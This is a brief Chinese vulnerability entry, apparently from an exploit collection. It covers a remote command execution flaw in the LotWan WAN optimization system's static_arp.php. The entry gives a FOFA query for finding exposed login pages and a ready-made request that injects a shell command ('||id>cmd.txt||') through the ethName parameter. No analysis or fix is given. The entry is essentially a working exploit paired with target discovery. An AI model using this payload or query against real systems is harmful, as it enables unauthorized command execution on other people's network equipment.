# 华夏创新 LotWan广域网优化系统 static\_arp.php 远程命令执行漏洞

## 漏洞描述

华夏创新 LotWan广域网优化系统 static\_arp.php文件参数 ethName存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

```plain
华夏创新 LotWan广域网优化系统
```

## FOFA

```plain
title="LotWan 广域网优化系统"
```

登录页面

![202205191828884.png](/uploads/20260518/46e54a4e-79f4-4a1d-a917-2603040d9dc0.png)

```plain
/acc/bindipmac/static_arp.php?ethName=||id>cmd.txt||
```
